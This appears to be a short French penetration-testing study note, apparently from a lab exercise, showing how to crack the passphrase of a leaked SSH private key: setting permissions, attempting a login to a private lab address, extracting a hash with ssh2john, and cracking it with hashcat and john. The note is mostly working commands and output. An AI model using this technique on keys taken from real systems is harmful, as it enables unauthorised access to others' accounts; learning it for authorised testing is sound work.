## SSH Private Key Passphrase

Si l'on récupère un privatekey via un leak ou un accès et qu'ily'a une passphrase on peut l'a craqué.

D'abord on test de se co avec la clé.

```bash
On change les perms pour ne pas être refusé

chmod 600 id_rsa

On tente de se co
ssh -i id_rsa -p 2222 dave@192.168.50.201
The authenticity of host '[192.168.50.201]:2222 ([192.168.50.201]:2222)' can't be established.
ED25519 key fingerprint is SHA256:ab7+Mzb+0/fX5yv1tIDQsW/55n333/oGARIluRonao4.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.201]:2222' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa':

On voit qu'il y'a une passphrase, on va donc utiliser john pourcracker ça.

ssh2john id_rsa > ssh.hash

kali@kali:~/passwordattacks$ cat ssh.hash
id_rsa:$sshng$6$16$7059e78a8d3764ea1e883fcdf592feb7$1894$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000107059e78a8d3764ea1e883fcdf592feb7000000100000000100000197000000077373682...

Ensuite on tente de cracker le hash

hashcat -m 22921 ssh.hash ssh.passwords --force

john --wordlist=ssh.passwords ssh.hash
``` 
